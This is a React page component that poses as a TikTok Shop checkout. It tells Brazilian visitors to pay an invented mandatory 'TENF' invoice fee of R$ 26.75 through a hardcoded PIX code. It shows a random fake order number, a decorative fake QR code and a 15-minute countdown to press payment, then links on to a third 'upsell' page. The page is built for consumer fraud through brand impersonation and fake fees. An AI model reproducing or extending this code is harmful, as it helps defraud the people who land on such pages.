import { useState, useEffect, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { X, Copy, Clock, Loader2, CreditCard, Info, HelpCircle } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const Upsell2Page = () => {
  const navigate = useNavigate();
  const [showModal, setShowModal] = useState(false);
  const [timeLeft, setTimeLeft] = useState(900); // 15 minutos

  // Gerar número de pedido aleatório uma vez
  const orderNumber = useMemo(() => {
    return String(Math.floor(Math.random() * 90000) + 10000).padStart(8, '0');
  }, []);

  // Placeholder PIX code para upsell 2
  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP TENF6009SAO PAULO62070503***6304";

  useEffect(() => {
    if (!showModal) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [showModal]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyPix = async () => {
    try {
      await navigator.clipboard.writeText(pixCode);
      toast.success("Código PIX copiado!");
    } catch {
      toast.error("Erro ao copiar código");
    }
  };

  const handleOpenModal = () => {
    setTimeLeft(900); // Reset timer
    setShowModal(true);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header com Logo TikTok Shop - sem borda */}
      <div className="bg-white px-4 py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center p-4">
        <div className="w-full max-w-md space-y-4">
          
          {/* Card 1 - Status do Pedido */}
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0
                bg-gradient-to-br from-rose-100 via-rose-50 to-rose-200
                shadow-[0_4px_12px_rgba(244,63,94,0.25),inset_0_2px_4px_rgba(255,255,255,0.8),inset_0_-2px_4px_rgba(244,63,94,0.15)]
                border border-rose-200/50">
                <CreditCard className="w-6 h-6 text-rose-500 drop-shadow-sm" />
              </div>
              <div className="flex-1">
                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-3">Status do Pedido</h2>
                <div className="space-y-2 text-sm text-gray-600">
                  <p><span className="font-medium text-gray-700">Número do pedido:</span> {orderNumber}</p>
                  <p><span className="font-medium text-gray-700">Status:</span> Aguardando pagamento</p>
                  <p><span className="font-medium text-gray-700">Valor da TENF:</span> R$ 26,75</p>
                </div>
              </div>
            </div>
          </div>

          {/* Card 2 - Pagamento Pendente */}
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0
                bg-gradient-to-br from-rose-100 via-rose-50 to-rose-200
                shadow-[0_4px_12px_rgba(244,63,94,0.25),inset_0_2px_4px_rgba(255,255,255,0.8),inset_0_-2px_4px_rgba(244,63,94,0.15)]
                border border-rose-200/50">
                <Info className="w-6 h-6 text-rose-500 drop-shadow-sm" />
              </div>
              <div className="flex-1">
                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-2">Pagamento Pendente</h2>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Seu pedido está quase pronto para ser enviado! Para finalizar, realize o pagamento da TENF no valor de <strong>R$ 26,75</strong>.
                </p>
              </div>
            </div>
          </div>

          {/* Botão Pagar TENF */}
          <Button
            onClick={handleOpenModal}
            className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
          >
            PAGAR TENF - R$ 26,75
          </Button>

          {/* Card 3 - Por que preciso pagar? */}
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0
                bg-gradient-to-br from-rose-100 via-rose-50 to-rose-200
                shadow-[0_4px_12px_rgba(244,63,94,0.25),inset_0_2px_4px_rgba(255,255,255,0.8),inset_0_-2px_4px_rgba(244,63,94,0.15)]
                border border-rose-200/50">
                <HelpCircle className="w-6 h-6 text-rose-500 drop-shadow-sm" />
              </div>
              <div className="flex-1">
                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-2">Por que preciso pagar a TENF?</h2>
                <p className="text-sm text-gray-600 leading-relaxed">
                  A TENF é uma taxa obrigatória para emissão da nota fiscal. Após o pagamento, seu pedido será enviado em até 24 horas.
                </p>
              </div>
            </div>
          </div>

          {/* Logos SlimHealth + CIMED */}
          <div className="flex items-center justify-center gap-3 mt-6 mb-8">
            <img 
              src={slimhealthLogo} 
              alt="SlimHealth" 
              className="h-7 object-contain opacity-70"
            />
            <span className="text-lg font-bold text-muted-foreground">+</span>
            <img 
              src={cimedLogo} 
              alt="CIMED" 
              className="h-5 object-contain opacity-70"
            />
          </div>
        </div>
      </div>

      {/* Modal de Pagamento One-Click */}
      {showModal && (
        <div 
          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4"
          onClick={() => setShowModal(false)}
        >
          <div 
            className="bg-white w-full max-w-sm rounded-2xl overflow-hidden shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Header do Modal */}
            <div className="bg-white px-4 py-3 flex items-center justify-between">
              <div className="w-8" /> {/* Spacer */}
              <img src={tiktokLogo} alt="TikTok Shop" className="h-8 w-auto" />
              <button 
                onClick={() => setShowModal(false)}
                className="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>

            {/* Conteúdo do Modal */}
            <div className="p-6">
              {/* Título e Valor */}
              <div className="text-center mb-4">
                <p className="text-gray-500 text-sm font-medium">TENF</p>
                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 26,75</p>
              </div>

              {/* QR Code */}
              <div className="flex justify-center mb-4">
                <div className="w-48 h-48 bg-gray-100 border-2 border-gray-200 rounded-lg flex items-center justify-center">
                  <div className="w-36 h-36 bg-gray-200 rounded grid grid-cols-6 grid-rows-6 gap-0.5 p-2">
                    {Array.from({ length: 36 }).map((_, i) => (
                      <div 
                        key={i} 
                        className={`rounded-sm ${Math.random() > 0.4 ? 'bg-gray-800' : 'bg-white'}`}
                      />
                    ))}
                  </div>
                </div>
              </div>

              {/* Botão Copiar */}
              <Button
                onClick={handleCopyPix}
                className="w-full bg-rose-500 hover:bg-rose-600 text-white font-semibold py-3 rounded-xl flex items-center justify-center gap-2"
              >
                <Copy className="w-5 h-5" />
                Copiar código PIX
              </Button>

              {/* Timer de Expiração */}
              <div className="flex items-center justify-center gap-2 mt-4 text-amber-600">
                <Clock className="w-4 h-4" />
                <span className="text-sm font-medium">
                  O PIX expira em: <span className="font-bold">{formatTime(timeLeft)}</span>
                </span>
              </div>

              {/* Aguardando Confirmação */}
              <div className="flex items-center justify-center gap-2 mt-2 text-amber-600">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span className="text-sm">Aguardando confirmação...</span>
              </div>

              {/* Código PIX truncado */}
              <p className="text-xs text-gray-400 text-center mt-4 break-all line-clamp-2 px-2">
                {pixCode}
              </p>

              {/* Simulate payment button (for testing) */}
              <Button
                onClick={() => {
                  toast.success("Pagamento confirmado!");
                  setShowModal(false);
                  navigate("/upsell3");
                }}
                variant="outline"
                className="w-full mt-4 border-gray-300 text-gray-600 font-medium py-2 rounded-xl"
              >
                Simular Pagamento (Teste)
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Upsell2Page;
